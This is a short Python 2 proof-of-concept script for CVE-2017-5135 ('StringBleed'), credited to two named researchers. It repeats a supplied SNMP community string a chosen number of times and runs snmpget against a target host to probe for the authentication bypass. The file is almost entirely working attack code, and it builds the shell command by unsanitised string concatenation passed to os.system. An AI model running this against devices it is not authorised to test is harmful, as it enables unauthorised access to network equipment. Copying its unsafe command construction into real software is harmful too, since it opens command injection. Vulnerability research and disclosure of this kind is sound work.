# -*- coding: utf-8 -*-
import socket
import sys
import os

'''

Simple python script for fuzzer the field "community strings" 

[*] Research: "#stringbleed" (CVE-2017-5135)
	[+] twitter: @stringbleed
	[+] mail to: stringbleed@protonmail.com

by:
   [+] Bertin Jose  (Costa Rica) 
   [+] twitter: @bertinjoseb

   [+] Fernandez Ezequiel  (Argentina) 
   [+] twitter: @capitan_alfa

'''

class Colors:
    BLUE 		= '\033[94m'
    GREEN 		= '\033[32m'
    RED 		= '\033[0;31m'
    DEFAULT 	= '\033[0m'
    ORANGE 		= '\033[33m'
    WHITE 		= '\033[97m'
    BOLD 		= '\033[1m'
    BR_COLOUR 	= '\033[1;37;40m'

def help():
	print Colors.ORANGE+"Test of communitys strings de devices with services SNMP"
	print Colors.GREEN+"Use:"+Colors.BLUE+"\n\t%s <host> <version> <community> <community x N> " % sys.argv[0]
	print "\n"+Colors.DEFAULT

	exit(1)

try: 
	host 	= sys.argv[1]   # Host
	version = sys.argv[2]   # 1 o 2c
	comm 	= sys.argv[3]   # fuck community
	coXN 	= sys.argv[4]   # MULTIPLICADOR str community
except Exception, e:
	help()
	print '\n'+e


def snmp():
	injection = (comm * int(coXN))

	a = "snmpget -v "+version+ " -c "+injection +" "+host +" iso.3.6.1.2.1.1.1.0 "
	# censuraPOCs  = host.
	b = "snmpget -v "+version+ " -c "+Colors.RED +injection +Colors.ORANGE +" "+host +Colors.GREEN +" iso.3.6.1.2.1.1.1.0 "

	print Colors.GREEN+'\nexec: '+b
	print Colors.BLUE+'\nlength injection: '+str(len(injection))
	print 'Max injection is: 256'
	print Colors.GREEN +'\nStart...\n'+ Colors.ORANGE


	os.system(a)

	print '\n'+ Colors.DEFAULT

snmp()